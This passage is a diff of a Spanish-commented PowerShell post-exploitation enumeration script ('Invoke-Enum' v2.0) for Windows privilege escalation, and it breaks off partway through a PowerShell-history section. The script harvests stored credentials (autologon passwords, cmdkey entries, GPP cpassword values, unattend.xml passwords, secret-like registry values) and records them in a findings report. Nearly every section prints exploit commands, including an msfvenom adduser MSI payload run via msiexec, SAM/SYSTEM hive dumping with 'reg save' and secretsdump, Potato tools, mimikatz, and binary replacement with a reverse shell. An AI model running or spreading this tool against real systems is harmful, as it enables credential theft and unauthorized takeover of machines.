@@ -1,5 +1,20 @@
 #encoding: UTF-8
-Write-Host "======== Invoke-Enum v1.0========" -ForegroundColor Cyan
+$startTime = Get-Date
+Write-Host "======== Invoke-Enum v2.0 - $(Get-Date) ========" -ForegroundColor Cyan
+
+# Inicializar array para exportacion
+$global:Findings = @()
+
+function Add-Finding {
+    param($Category, $Finding, $Risk, $Details)
+    $global:Findings += [PSCustomObject]@{
+        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        Category = $Category
+        Finding = $Finding
+        RiskLevel = $Risk
+        Details = $Details
+    }
+}
 
 function Show-Section($txt) {
     Write-Host "`n======================= $txt =======================" -ForegroundColor Magenta
@@ -9,9 +24,10 @@ function Safe-Child($p, $filter) { try { return Get-ChildItem -Path $p -Recurse 
 function Safe-Props($key) { try { return Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } catch { return $null } }
 
 $ErrorActionPreference = "SilentlyContinue"
+$outputFile = "Enum-Report-$($env:COMPUTERNAME)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 
-# ================= Información del Sistema =================
-Show-Section "Información del Sistema"
+# ================= Informacion del Sistema =================
+Show-Section "Informacion del Sistema"
 
 function Safe-Get {
     param (
@@ -30,68 +46,175 @@ Try {
     $cs = Safe-Get { Get-CimInstance Win32_ComputerSystem } { Get-WmiObject Win32_ComputerSystem }
     $patches = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5
 
-    Write-Host "Nombre del sistema operativo: $($os.Caption)" -ForegroundColor Cyan
-    Write-Host "Versión: $($os.Version) - Build $($os.BuildNumber)" -ForegroundColor Cyan
-    Write-Host "Arquitectura: $($os.OSArchitecture)" -ForegroundColor Cyan
-    Write-Host "Idioma del sistema: $($os.MUILanguages -join ', ')" -ForegroundColor Cyan
-    Write-Host "Usuario actual: $env:USERNAME" -ForegroundColor Cyan
-    Write-Host "Nombre del host: $env:COMPUTERNAME" -ForegroundColor Cyan
-    Write-Host "Fabricante: $($cs.Manufacturer)" -ForegroundColor Cyan
-    Write-Host "Modelo: $($cs.Model)" -ForegroundColor Cyan
+    $sysInfo = @"
+Nombre del sistema operativo: $($os.Caption)
+Version: $($os.Version) - Build $($os.BuildNumber)
+Arquitectura: $($os.OSArchitecture)
+Idioma del sistema: $($os.MUILanguages -join ', ')
+Usuario actual: $env:USERNAME
+Nombre del host: $env:COMPUTERNAME
+Fabricante: $($cs.Manufacturer)
+Modelo: $($cs.Model)
+"@
+
+    Write-Host $sysInfo -ForegroundColor Cyan
+    Add-Finding -Category "System Info" -Finding "Basic System Information" -Risk "Info" -Details $sysInfo
 
     $installDate = $os.InstallDate
     if ($installDate -is [string]) {
         $installDate = [Management.ManagementDateTimeConverter]::ToDateTime($installDate)
     }
-    Write-Host "Fecha de instalación: $installDate" -ForegroundColor Cyan
+    Write-Host "Fecha de instalacion: $installDate" -ForegroundColor Cyan
 
     $bootTime = $os.LastBootUpTime
     if ($bootTime -is [string]) {
         $bootTime = [Management.ManagementDateTimeConverter]::ToDateTime($bootTime)
     }
-    Write-Host "Último reinicio: $bootTime" -ForegroundColor Cyan
+    Write-Host "ultimo reinicio: $bootTime" -ForegroundColor Cyan
 
-    Write-Host "`nÚltimos parches instalados:" -ForegroundColor Yellow
+    Write-Host "`nultimos parches instalados:" -ForegroundColor Yellow
+    $patchInfo = ""
     foreach ($p in $patches) {
+        $patchInfo += "  - $($p.HotFixID) instalado el $($p.InstalledOn)`n"
         Write-Host "  - $($p.HotFixID) instalado el $($p.InstalledOn)" -ForegroundColor White
     }
+    Add-Finding -Category "System Info" -Finding "Last Patches" -Risk "Info" -Details $patchInfo
 }
 Catch {
-    Write-Host "[!] Error al obtener información del sistema." -ForegroundColor Red
+    Write-Host "[!] Error al obtener informacion del sistema." -ForegroundColor Red
+    Add-Finding -Category "System Info" -Finding "Error" -Risk "Info" -Details "Error getting system information"
+}
+
+# ================= CHECK UAC =================
+Show-Section "UAC Settings"
+Try {
+    $uac = reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>$null
+    if ($uac -match "0x1") {
+        Write-Host "[!] UAC Habilitado (EnableLUA=1)" -ForegroundColor Yellow
+        Add-Finding -Category "UAC" -Finding "UAC Enabled" -Risk "Medium" -Details "User Account Control is enabled"
+    } else {
+        Write-Host "[!] UAC Deshabilitado (EnableLUA=0)" -ForegroundColor Red
+        Add-Finding -Category "UAC" -Finding "UAC Disabled" -Risk "High" -Details "User Account Control is disabled - easier privilege escalation"
+    }
+} catch {
+    Write-Host "[!] No se pudo verificar UAC" -ForegroundColor DarkGray
+}
+
+# ================= DPAPI USER CREDENTIALS =================
+Show-Section "DPAPI User Credentials"
+Write-Host "[*] Buscando credenciales DPAPI de usuarios..." -ForegroundColor Yellow
+
+Try {
+    # Credenciales guardadas en el registro
+    $dpapiKeys = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\Environment"
+    )
+    
+    foreach ($key in $dpapiKeys) {
+        $props = Safe-Props $key
+        if ($props) {
+            $props.PSObject.Properties | Where-Object { 
+                $_.Name -match "password|cred|key|secret|token" -or 
+                $_.Value -match "password|cred|key|secret|token" 
+            } | ForEach-Object {
+                Write-Host "[DPAPI] $key\$($_.Name) = $($_.Value)" -ForegroundColor Red
+                Add-Finding -Category "DPAPI" -Finding "Potential Credential" -Risk "High" -Details "$key\$($_.Name) = $($_.Value)"
+            }
+        }
+    }
+    
+    # Buscar archivos de credenciales
+    $credFiles = @(
+        "$env:USERPROFILE\*.cred",
+        "$env:USERPROFILE\*.key",
+        "$env:USERPROFILE\*.pfx",
+        "$env:APPDATA\*.cred",
+        "$env:LOCALAPPDATA\*.key"
+    )
+    
+    foreach ($pattern in $credFiles) {
+        Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host "[DPAPI] Archivo de credenciales: $($_.FullName)" -ForegroundColor Red
+            Add-Finding -Category "DPAPI" -Finding "Credential File" -Risk "High" -Details "Found: $($_.FullName)"
+        }
+    }
+} catch {
+    Write-Host "[!] Error buscando credenciales DPAPI" -ForegroundColor DarkGray
 }
 
 # ================= INFORMACION DE RED =================
-Show-Section "Información de red extendida"
-
-ipconfig /all | Out-String | Write-Host  -ForegroundColor White
-route print | Out-String | Write-Host  -ForegroundColor White
-
+Show-Section "Informacion de red extendida"
+Try {
+    $ipConfig = ipconfig /all | Out-String
+    $route = route print | Out-String
+    
+    Write-Host $ipConfig -ForegroundColor White
+    Write-Host $route -ForegroundColor White
+    
+    Add-Finding -Category "Network" -Finding "IP Configuration" -Risk "Info" -Details $ipConfig
+    Add-Finding -Category "Network" -Finding "Routing Table" -Risk "Info" -Details $route
+} catch {
+    Write-Host "[!] Error obteniendo informacion de red" -ForegroundColor Red
+}
 
 # ================= USUARIOS Y PRIVILEGIOS =================
 Show-Section "Usuarios y Privilegios"
-Try { net user } catch {}
-Try { net localgroup Administradores } catch {}
-Try { whoami /priv } catch {}
+Try { 
+    $users = net user | Out-String
+    $admins = net localgroup Administradores | Out-String
+    $privs = whoami /priv | Out-String
+    
+    Write-Host $users -ForegroundColor Cyan
+    Write-Host $admins -ForegroundColor Cyan
+    Write-Host $privs -ForegroundColor Cyan
+    
+    Add-Finding -Category "Users" -Finding "Local Users" -Risk "Info" -Details $users
+    Add-Finding -Category "Users" -Finding "Administrators Group" -Risk "Info" -Details $admins
+    Add-Finding -Category "Privileges" -Finding "Current User Privileges" -Risk "Info" -Details $privs
+} catch {}
 
 # ================= ALWAYSINSTALL ELEVATED =================
 Show-Section "AlwaysInstallElevated"
 Write-Host "[*] POC: Si ambas claves valen 1, puedes ejecutar MSI como SYSTEM"
 Write-Host "[+] Exploit: msfvenom -p windows/adduser USER=hacker PASS=123456 -f msi > evil.msi"
 Write-Host "[+] Ejecutar: msiexec /quiet /qn /i evil.msi"
-Try { reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated } catch {}
-Try { reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated } catch {}
+Try { 
+    $aie1 = reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
+    $aie2 = reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
+    Write-Host "HKCU: $aie1" -ForegroundColor Yellow
+    Write-Host "HKLM: $aie2" -ForegroundColor Yellow
+    
+    if ($aie1 -match "0x1" -and $aie2 -match "0x1") {
+        Add-Finding -Category "PrivEsc" -Finding "AlwaysInstallElevated Enabled" -Risk "Critical" -Details "Both registry keys set to 1 - MSI files run as SYSTEM"
+    }
+} catch {}
 
 # ================= AUTOLOGON =================
 Show-Section "Autologon"
 Write-Host "[*] POC: Puede revelar usuario y contrasena configurados para login automatico"
 Write-Host "[+] Exploit: Extraer DefaultUserName y DefaultPassword y loguearte localmente"
-Try { reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr Default } catch {}
+Try { 
+    $autoLogon = reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | findstr Default
+    Write-Host $autoLogon -ForegroundColor Yellow
+    if ($autoLogon -match "DefaultPassword") {
+        Add-Finding -Category "Credentials" -Finding "Autologon Password Found" -Risk "High" -Details $autoLogon
+    }
+} catch {}
 
 # ================= CMDKEY =================
 Show-Section "Credenciales (cmdkey)"
 Write-Host "[*] POC: Lista credenciales almacenadas para conexiones remotas"
 Write-Host "[+] Exploit: Usar cmdkey /list y luego runas /savecred para ejecutar como otro usuario"
-Try { cmdkey /list } catch {}
+Try { 
+    $cmdkey = cmdkey /list 2>$null
+    Write-Host $cmdkey -ForegroundColor Yellow
+    if ($cmdkey) {
+        Add-Finding -Category "Credentials" -Finding "Stored Credentials" -Risk "Medium" -Details $cmdkey
+    }
+} catch {}
 
 # ================= TOKENS PRIVILEGIADOS =================
 Show-Section "Tokens Privilegiados"
@@ -104,16 +227,46 @@ Try {
         if ($privs -match $t) {
             Write-Host "[!] Token detectado: $t" -ForegroundColor Red
             switch ($t) {
-                "SeImpersonatePrivilege" { Write-Host "[+] Exploit: Usar PrintSpoofer, RoguePotato, JuicyPotato para escalar a SYSTEM" -ForegroundColor Cyan }
-                "SeAssignPrimaryTokenPrivilege" { Write-Host "[+] Exploit: Crear proceso con token primario (S4U o abuso de servicio)" -ForegroundColor Cyan }
-                "SeDebugPrivilege" { Write-Host "[+] Exploit: Inyectar procesos SYSTEM (ej: con mimikatz o ProcessHacker)" -ForegroundColor Cyan }
-                "SeBackupPrivilege" { Write-Host "[+] Exploit: Leer SAM/SYSTEM con 'reg save'" -ForegroundColor Cyan }
-                "SeRestorePrivilege" { Write-Host "[+] Exploit: Restaurar archivos protegidos o reemplazar binarios" -ForegroundColor Cyan }
-                "SeTakeOwnershipPrivilege" { Write-Host "[+] Exploit: Tomar propiedad con 'takeown' y cambiar ACL con 'icacls'" -ForegroundColor Cyan }
-                "SeLoadDriverPrivilege" { Write-Host "[+] Exploit: Cargar drivers maliciosos si no hay control de firmas" -ForegroundColor Cyan }
-                "SeTcbPrivilege" { Write-Host "[+] Exploit: Actuar como subsistema confiable (muy potente, raro de explotar)" -ForegroundColor Cyan }
-                "SeManageVolumePrivilege" { Write-Host "[+] Exploit: Leer disco crudo o montar volumenes manualmente" -ForegroundColor Cyan }
-                "SeCreateTokenPrivilege" { Write-Host "[+] Exploit: Crear tokens arbitrarios. Requiere tecnicas avanzadas" -ForegroundColor Cyan }
+                "SeImpersonatePrivilege" { 
+                    Write-Host "[+] Exploit: Usar PrintSpoofer, RoguePotato, JuicyPotato para escalar a SYSTEM" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeImpersonatePrivilege" -Risk "High" -Details "Use PrintSpoofer/RoguePotato for privilege escalation"
+                }
+                "SeAssignPrimaryTokenPrivilege" { 
+                    Write-Host "[+] Exploit: Crear proceso con token primario (S4U o abuso de servicio)" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeAssignPrimaryTokenPrivilege" -Risk "High" -Details "Create process with primary token"
+                }
+                "SeDebugPrivilege" { 
+                    Write-Host "[+] Exploit: Inyectar procesos SYSTEM (ej: con mimikatz o ProcessHacker)" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeDebugPrivilege" -Risk "High" -Details "Debug processes and inject code"
+                }
+                "SeBackupPrivilege" { 
+                    Write-Host "[+] Exploit: Leer SAM/SYSTEM con 'reg save'" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeBackupPrivilege" -Risk "High" -Details "Read SAM/SYSTEM hives with reg save"
+                }
+                "SeRestorePrivilege" { 
+                    Write-Host "[+] Exploit: Restaurar archivos protegidos o reemplazar binarios" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeRestorePrivilege" -Risk "High" -Details "Restore protected files or replace binaries"
+                }
+                "SeTakeOwnershipPrivilege" { 
+                    Write-Host "[+] Exploit: Tomar propiedad con 'takeown' y cambiar ACL con 'icacls'" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeTakeOwnershipPrivilege" -Risk "High" -Details "Take ownership of files and change ACLs"
+                }
+                "SeLoadDriverPrivilege" { 
+                    Write-Host "[+] Exploit: Cargar drivers maliciosos si no hay control de firmas" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeLoadDriverPrivilege" -Risk "High" -Details "Load malicious drivers if no signature enforcement"
+                }
+                "SeTcbPrivilege" { 
+                    Write-Host "[+] Exploit: Actuar como subsistema confiable (muy potente, raro de explotar)" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeTcbPrivilege" -Risk "Critical" -Details "Act as part of trusted computing base"
+                }
+                "SeManageVolumePrivilege" { 
+                    Write-Host "[+] Exploit: Leer disco crudo o montar volumenes manualmente" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeManageVolumePrivilege" -Risk "High" -Details "Read raw disk or mount volumes manually"
+                }
+                "SeCreateTokenPrivilege" { 
+                    Write-Host "[+] Exploit: Crear tokens arbitrarios. Requiere tecnicas avanzadas" -ForegroundColor Cyan
+                    Add-Finding -Category "Privileges" -Finding "SeCreateTokenPrivilege" -Risk "Critical" -Details "Create arbitrary tokens - advanced techniques required"
+                }
             }
         }
     }
@@ -122,7 +275,7 @@ Try {
 # ================= Servicios con rutas sin comillas =================
 Show-Section "Servicios con rutas sin comillas (Unquoted Service Paths)"
 
-Write-Host "[*] POC: Si la ruta tiene espacios y no está entre comillas, puedes abusar de carpetas intermedias"
+Write-Host "[*] POC: Si la ruta tiene espacios y no esta entre comillas, puedes abusar de carpetas intermedias"
 Write-Host "[+] Exploit: Crear ejecutable en ruta parcial y reiniciar el servicio"
 
 $found = $false
@@ -143,6 +296,7 @@ Try {
                 Write-Host "[!] Servicio vulnerable: $($svc.Name)" -ForegroundColor Red
                 Write-Host "    Binario: $exe" -ForegroundColor Yellow
                 Write-Host "    Sugerencia: Ejecuta 'sc qc $($svc.Name)' para validarlo manualmente" -ForegroundColor DarkGray
+                Add-Finding -Category "Services" -Finding "Unquoted Service Path" -Risk "High" -Details "Service: $($svc.Name), Path: $exe"
                 $found = $true
             }
         }
@@ -155,7 +309,6 @@ Try {
 Catch {
     Write-Host "[!] Error durante el escaneo de rutas sin comillas." -ForegroundColor DarkGray
 }
-
 
 # ================= Carpetas con permisos WRITE/MODIFY =================
 Show-Section "Carpetas vulnerables con permisos WRITE/MODIFY "
@@ -187,6 +340,7 @@ foreach ($base in $programDirs) {
                     if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                         $entry.FileSystemRights.ToString() -match "Write|Modify|FullControl") {
                         Write-Host "[!] Carpeta vulnerable: $dir" -ForegroundColor Yellow
+                        Add-Finding -Category "FileSystem" -Finding "Writable Directory" -Risk "Medium" -Details "Directory: $dir, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                         break
                     }
                 }
@@ -194,8 +348,6 @@ foreach ($base in $programDirs) {
         } catch {}
     }
 }
-
-
 
 # ================= Servicios con binarios modificables por el usuario =================
 Show-Section "Servicios con binarios modificables por el usuario"
@@ -220,6 +372,7 @@ Try {
                             Write-Host "`n[!] Servicio vulnerable: $($_.Name)" -ForegroundColor Red
                             Write-Host "    Binario: $bin" -ForegroundColor Yellow
                             Write-Host "    Permiso: $($entry.IdentityReference): $($entry.FileSystemRights)" -ForegroundColor Green
+                            Add-Finding -Category "Services" -Finding "Writable Service Binary" -Risk "High" -Details "Service: $($_.Name), Binary: $bin, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                             $found = $true
                         }
                     }
@@ -234,9 +387,8 @@ Try {
         Write-Host "[*] No se encontraron servicios vulnerables con binarios modificables." -ForegroundColor Cyan
     }
 } Catch {
-    Write-Host "[!] Error crítico al analizar servicios modificables." -ForegroundColor DarkGray
+    Write-Host "[!] Error critico al analizar servicios modificables." -ForegroundColor DarkGray
 }
-
 
 # ================= Environment PATH - DLL Hijack =================
 Show-Section "Variables de entorno PATH y rutas hijackables"
@@ -254,11 +406,11 @@ Try {
                 if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                     ($entry.FileSystemRights.ToString() -match "Write|Modify|FullControl")) {
 
-                    # Salida tipo winPEAS con resumen
                     Write-Host "`n[*] Hijackable PATH Entry: $path" -ForegroundColor Yellow
                     Write-Host "    Usuario: $($entry.IdentityReference) Permiso: $($entry.FileSystemRights)" -ForegroundColor Green
                     Write-Host "[!] Possible DLL Hijacking in: $path [$($entry.IdentityReference): $($entry.FileSystemRights)]" -ForegroundColor Red
                     Write-Host "======================================================================================" -ForegroundColor DarkGray
+                    Add-Finding -Category "PrivEsc" -Finding "DLL Hijacking Potential" -Risk "High" -Details "PATH: $path, Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                 }
             }
         } Catch {
@@ -269,7 +421,6 @@ Try {
 Catch {
     Write-Host "[!] Error general al procesar variables de entorno." -ForegroundColor Red
 }
-
 
 # ================= AUTORUNS - MODIFICABLES =================
 Show-Section "Autoruns - Ejecutables con posibles modificaciones"
@@ -282,6 +433,7 @@ foreach ($key in $runKeys) {
         $props.PSObject.Properties | ForEach-Object {
             if ($_.Value -match ".exe") {
                 Write-Host "[Autorun] $($_.Name): $($_.Value)" -ForegroundColor Yellow
+                Add-Finding -Category "Persistence" -Finding "Autorun Entry" -Risk "Medium" -Details "Registry: $key, Name: $($_.Name), Value: $($_.Value)"
             }
         }
     }
@@ -289,15 +441,18 @@ foreach ($key in $runKeys) {
 
 # ================= TAREAS PROGRAMADAS =================
 Show-Section "Tareas programadas del usuario (no-Microsoft)"
-Write-Host "[*] POC: Las tareas pueden ejecutarse automáticamente con permisos elevados"
+Write-Host "[*] POC: Las tareas pueden ejecutarse automaticamente con permisos elevados"
 Write-Host "[+] Exploit:"
 Write-Host "  1. Buscar tareas que se ejecuten como SYSTEM o con RunLevel=Highest"
 Write-Host "  2. Verificar si el binario asociado es modificable por el usuario actual"
-Write-Host "  3. Si es modificable, reemplazar por binario malicioso y esperar ejecución"
+Write-Host "  3. Si es modificable, reemplazar por binario malicioso y esperar ejecucion"
 
 Try {
-    Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
-        Format-Table TaskName, TaskPath, State -AutoSize
+    $tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }
+    if ($tasks) {
+        $tasks | Format-Table TaskName, TaskPath, State -AutoSize
+        Add-Finding -Category "Scheduled Tasks" -Finding "Non-Microsoft Scheduled Tasks" -Risk "Medium" -Details ($tasks | Out-String)
+    }
 }
 Catch {
     Write-Host "[!] Error procesando tareas con Get-ScheduledTask" -ForegroundColor DarkGray
@@ -313,14 +468,13 @@ Try {
             if (-not $shown.ContainsKey($exe)) {
                 $shown[$exe] = $true
                 Write-Host "[*] Ejecutable: $exe" -ForegroundColor Yellow
+                Add-Finding -Category "Scheduled Tasks" -Finding "Scheduled Task Executable" -Risk "Medium" -Details "Executable: $exe"
             }
         }
     }
 } Catch {
     Write-Host "[!] Error ejecutando schtasks" -ForegroundColor DarkGray
 }
-
-
 
 # ======================= Puertos abiertos + servicios =======================
 Show-Section "Puertos abiertos + servicios"
@@ -355,7 +509,9 @@ Try {
         }
     }
 
-    $unique.Values | Sort-Object Puerto | Format-Table -AutoSize
+    $portInfo = $unique.Values | Sort-Object Puerto | Format-Table -AutoSize | Out-String
+    Write-Host $portInfo -ForegroundColor Cyan
+    Add-Finding -Category "Network" -Finding "Open Ports" -Risk "Info" -Details $portInfo
 } catch {
     Write-Host "[!] Error al obtener puertos y procesos" -ForegroundColor Red
 }
@@ -367,7 +523,7 @@ Write-Host "[*] POC: Ejecutables con permisos FULLCONTROL para Everyone o Users 
 Write-Host "[+] Exploit:"
 Write-Host "  1. Busca binarios *.exe modificables ubicados fuera de system32"
 Write-Host "  2. Inyecta tu payload (por ejemplo un reverse shell o add admin)"
-Write-Host "  3. Espera ejecución por parte de un proceso privilegiado (servicio, login script, etc.)"
+Write-Host "  3. Espera ejecucion por parte de un proceso privilegiado (servicio, login script, etc.)"
 
 $excludedFolders = @("C:\Windows", "C:\PerfLogs", "C:\Symbols")
 
@@ -391,26 +547,29 @@ Try {
                     Write-Host "[+] Ejecutable vulnerable: $($_.FullName)" -ForegroundColor Red
                     Write-Host "    Usuario : $($entry.IdentityReference)" -ForegroundColor Yellow
                     Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
+                    Add-Finding -Category "FileSystem" -Finding "Writable Executable" -Risk "High" -Details "File: $($_.FullName), Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                 }
             }
         }
     }
 }
 Catch {
-    Write-Host "[!] Error durante la búsqueda extensiva." -ForegroundColor DarkGray
+    Write-Host "[!] Error durante la busqueda extensiva." -ForegroundColor DarkGray
 }
-
-
 
 # ================= PROGRAMAS INSTALADOS =================
 Show-Section "Aplicaciones instaladas de terceros (no Windows)"
 Write-Host "[*] POC: Aplicaciones no Microsoft pueden tener vulnerabilidades locales"
 Write-Host "[+] Exploit: Verificar versiones vulnerables con searchsploit o CVE DB"
 Try {
-    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
-    Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows" } |
-    ForEach-Object {
-        Write-Host "[+] $($_.DisplayName) - $($_.DisplayVersion)" -ForegroundColor Cyan
+    $apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows" }
+    
+    if ($apps) {
+        foreach ($app in $apps) {
+            Write-Host "[+] $($app.DisplayName) - $($app.DisplayVersion)" -ForegroundColor Cyan
+            Add-Finding -Category "Software" -Finding "Third-Party Application" -Risk "Info" -Details "$($app.DisplayName) - $($app.DisplayVersion)"
+        }
     }
 } catch {}
 
@@ -425,18 +584,17 @@ Try {
             Try {
                 $ver = (Get-Item $path).VersionInfo.FileVersion
                 Write-Host "[Servicio] $($_.Name) => $ver" -ForegroundColor Cyan
+                Add-Finding -Category "Services" -Finding "Service Version" -Risk "Info" -Details "Service: $($_.Name), Version: $ver"
             } catch {}
         }
     }
 } catch {}
 
-
-
 # ================= Archivos Ejecutables Modificables =================
 Show-Section "Archivos ejecutables/scripting con permisos WRITE"
 
-Write-Host "[*] POC: Archivos que pueden ser reemplazados o modificados para ejecución automática"
-Write-Host "[+] Exploit: Reemplazar payloads (.exe, .bat, .dll, .ps1, etc.) y abusar ejecución"
+Write-Host "[*] POC: Archivos que pueden ser reemplazados o modificados para ejecucion automatica"
+Write-Host "[+] Exploit: Reemplazar payloads (.exe, .bat, .dll, .ps1, .vbs, .msi) y abusar ejecucion"
 
 $extensions = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".dll", ".msi")
 $excludePaths = @("C:\Windows", "C:\PerfLogs")
@@ -463,6 +621,7 @@ Try {
                     Write-Host "    Usuario: $($entry.IdentityReference)" -ForegroundColor Yellow
                     Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
                     Write-Host "======================================================================================" -ForegroundColor DarkGray
+                    Add-Finding -Category "FileSystem" -Finding "Writable Script/Executable" -Risk "High" -Details "File: $($_.FullName), Permission: $($entry.IdentityReference): $($entry.FileSystemRights)"
                 }
             }
         }
@@ -472,9 +631,6 @@ Catch {
     Write-Host "[!] Error al enumerar archivos modificables." -ForegroundColor DarkGray
 }
 
-
-
-
 # ================= SAM & SYSTEM HIVES =================
 Show-Section "SAM & SYSTEM Hives Profundos"
 Write-Host "[*] POC: Dump de hives permite extraer hashes de usuarios locales"
@@ -482,34 +638,39 @@ Write-Host "[+] Exploit manual: reg save HKLM\\SAM C:\\Temp\\sam.save && reg sav
 Write-Host "[+] Analizar con: secretsdump.py -sam sam.save -system system.save LOCAL"
 
 $hives = @("SAM", "SYSTEM")
-$dirs = @("C:\Windows\Repair", "C:\Windows\System32\config", "C:\")
+$dirs = @("C:\Windows\Repair", "C:\Windows\System32\config", "C:\windows.old\windows\System32")
 
 foreach ($h in $hives) {
     foreach ($d in $dirs) {
         $f = "$d\$h"
         if (Test-Path $f) {
             Write-Host "[+] Hive encontrado: $f" -ForegroundColor Cyan
+            Add-Finding -Category "Credentials" -Finding "SAM/SYSTEM Hive" -Risk "High" -Details "Found: $f"
         }
     }
 }
 
-
-
 # ================= GPP - Groups.xml =================
 Show-Section "GPP - Groups.xml"
 
-Write-Host "[*] POC: Claves cpassword en XML permiten recuperar contraseñas"
-Write-Host "[+] Exploit: Usar GPPDecrypter para descifrar la contraseña"
+Write-Host "[*] POC: Claves cpassword en XML permiten recuperar passwords"
+Write-Host "[+] Exploit: Usar GPPDecrypter para descifrar la password"
 
 Try {
-    Get-ChildItem -Path "C:\*" -Filter "Groups.xml" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-        Write-Host "`n[*] Encontrado: $($_.FullName)" -ForegroundColor Red
-        Try {
-            Get-Content $_.FullName | Select-String "cpassword" | ForEach-Object {
-                Write-Host "    $_" -ForegroundColor Yellow
+    $groups = Get-ChildItem -Path "C:\*" -Filter "Groups.xml" -Recurse -Force -ErrorAction SilentlyContinue
+    if ($groups) {
+        foreach ($file in $groups) {
+            Write-Host "`n[*] Encontrado: $($file.FullName)" -ForegroundColor Red
+            Try {
+                $content = Get-Content $file.FullName
+                $cpass = $content | Select-String "cpassword"
+                if ($cpass) {
+                    Write-Host "    $cpass" -ForegroundColor Yellow
+                    Add-Finding -Category "Credentials" -Finding "GPP Password" -Risk "Critical" -Details "File: $($file.FullName), Content: $cpass"
+                }
+            } Catch {
+                Write-Host "    [!] No se pudo leer el contenido del archivo." -ForegroundColor DarkGray
             }
-        } Catch {
-            Write-Host "    [!] No se pudo leer el contenido del archivo." -ForegroundColor DarkGray
         }
     }
 }
@@ -517,11 +678,10 @@ Catch {
     Write-Host "[!] Error general al buscar Groups.xml" -ForegroundColor DarkGray
 }
 
-
 # ================= ARCHIVOS UNATTENDED =================
 Show-Section "Archivos Unattended"
 
-Write-Host "[*] POC: Archivos XML pueden contener contraseñas en texto plano"
+Write-Host "[*] POC: Archivos XML pueden contener passwords en texto plano"
 Write-Host "[+] Exploit: Buscar Password y usarla con runas, psexec o SMB"
 
 $files = @("unattend.xml", "sysprep.xml", "autounattend.xml")
@@ -539,12 +699,14 @@ foreach ($d in $dirs) {
                     Try {
                         $lines = Get-Content $fnd.FullName
                         $insideBlock = $false
+                        $passwordContent = ""
                         foreach ($line in $lines) {
                             if ($line -match "<Password>") {
                                 $insideBlock = $true
                             }
 
                             if ($insideBlock) {
+                                $passwordContent += "    $line`n"
                                 Write-Host "    $line" -ForegroundColor Green
                             }
 
@@ -554,7 +716,11 @@ foreach ($d in $dirs) {
 
                             if ($line -match "<Username>|<Enabled>") {
                                 Write-Host "    $line" -ForegroundColor Cyan
+                                $passwordContent += "    $line`n"
                             }
+                        }
+                        if ($passwordContent) {
+                            Add-Finding -Category "Credentials" -Finding "Unattended Password" -Risk "Critical" -Details "File: $($fnd.FullName)`n$passwordContent"
                         }
                     } Catch {
                         Write-Host "    [!] No se pudo leer el archivo." -ForegroundColor DarkGray
@@ -564,7 +730,6 @@ foreach ($d in $dirs) {
         } Catch {}
     }
 }
-
 
 # ================= Archivos Sensibles en Disco =================
 Show-Section "Archivos Sensibles en Disco"
@@ -600,6 +765,7 @@ foreach ($dir in $searchDirs) {
                 if (-not $reportedPaths.Contains($path)) {
                     $reportedPaths.Add($path) | Out-Null
                     Write-Host "[!] Posible archivo sensible: $path" -ForegroundColor Yellow
+                    Add-Finding -Category "Sensitive Files" -Finding "Potential Sensitive File" -Risk "Medium" -Details "Found: $path"
                 }
             }
         } catch {
@@ -609,3 +775,121 @@ foreach ($dir in $searchDirs) {
 }
 
 
+# ================= HISTORIAL DE POWERSHELL =================
+Show-Section "Historial de Powershell"
+
+Write-Host "[*] Buscando historial de PowerShell en perfiles de usuario..." -ForegroundColor Yellow
+Write-Host "[+] Los archivos de historial pueden contener comandos sensibles, passwords, etc." -ForegroundColor Cyan
+
+# Obtener todos los directorios de usuarios
+$userDirectories = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue
+
+if ($userDirectories) {
+    foreach ($userDir in $userDirectories) {
